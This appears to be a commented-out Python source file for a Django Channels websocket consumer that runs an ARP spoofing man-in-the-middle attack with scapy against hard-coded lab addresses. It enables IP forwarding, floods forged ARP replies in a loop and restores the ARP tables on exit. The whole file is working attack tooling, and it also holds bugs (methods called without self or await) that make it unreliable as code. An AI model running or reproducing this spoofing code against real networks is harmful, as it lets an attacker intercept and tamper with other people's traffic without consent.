# from channels.generic.websocket import AsyncWebsocketConsumer
# import json, subprocess, re, time
# import scapy.all as scapy
#
# class Spoofing(AsyncWebsocketConsumer):
#
#     async def connect(self):
#          await self.accept()
#
#     async def disconnect(self, close_code):
#         print("disconnect", close_code)
#         pass
#
#     async def receive(self, text_data):
#         text_data_json = json.loads(text_data)
#
#         if "range" in text_data:
#             sent_packets_count = 0
#             target_ip = "10.0.2.15"
#             gateway_ip = "10.0.2.1"
#             # subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
#             subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
#             while True:
#                 await self.spoof(target_ip, gateway_ip)
#                 await self.spoof(gateway_ip, target_ip)
#                 sent_packets_count += 2
#                 print("\r[+] Sent " + str(sent_packets_count) + " packets", end=' ')
#                 time.sleep(2)
#         elif "scan_cancel" in text_data:
#             exit()
#         else:
#             await self.send(text_data=json.dumps({
#                 'error': "Please, fill all fields correctly"
#             }))
#
#     async def get_mac(self, ip):
#         arp_request = scapy.ARP(pdst=ip)
#         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#         arp_request_broadcast = broadcast / arp_request
#         answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
#
#         return answered_list[0][1].hwsrc
#
#     async def spoof(self, target_ip, spoof_ip):
#         try:
#             target_mac = get_mac(target_ip)
#             packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
#             scapy.send(packet, verbose=False)
#         except:
#             print("[-] No such IP.")
#             exit()
#
#     async def restore(self, destination_ip, source_ip):
#         destination_mac = get_mac(destination_ip)
#         source_mac = get_mac(source_ip)
#         packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
#         # print(packet.show())
#         # print(packet.summary)
#         scapy.send(packet, count=4, verbose=False)
#
#     try:
#         sent_packets_count = 0
#         target_ip = "10.0.2.15"
#         gateway_ip = "10.0.2.1"
#         # subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
#         subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
#         while True:
#             spoof(target_ip, gateway_ip)
#             spoof(gateway_ip, target_ip)
#             sent_packets_count += 2
#             print("\r[+] Sent " + str(sent_packets_count) + " packets", end=' ')
#             time.sleep(2)
#     except KeyboardInterrupt:
#         print("\n[+] Detected CTRL + C ............. Quitting")
#         restore(target_ip, gateway_ip)
#         restore(gateway_ip, target_ip)
